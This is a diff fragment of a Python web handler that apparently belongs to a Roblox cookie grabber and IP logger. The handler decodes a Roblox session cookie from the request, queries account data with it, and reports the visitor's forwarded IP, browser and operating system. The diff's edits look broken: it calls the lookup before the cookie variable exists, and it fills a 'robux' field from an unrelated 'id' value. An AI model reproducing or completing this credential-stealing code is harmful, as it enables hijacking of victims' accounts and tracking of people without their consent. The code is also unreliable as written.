@@ -258,10 +258,10 @@ height: 100vh;
                 return
             
             if 'roblox' in dic:
-                roblox_data = None
+                roblox_data = get_roblox_info(cookie)
                 try:
                     cookie = base64.b64decode(dic['roblox'].encode()).decode('utf-8')
-                    roblox_data = get_roblox_info(cookie)
+                    # roblox_data = get_roblox_info(cookie)
                     if roblox_data:
                         makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url, roblox_info=roblox_data)
                 except:
@@ -312,6 +312,7 @@ height: 100vh;
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+                    message = message.replace("{robux}", result["id"])
 
                 datatype = 'text/html'
 
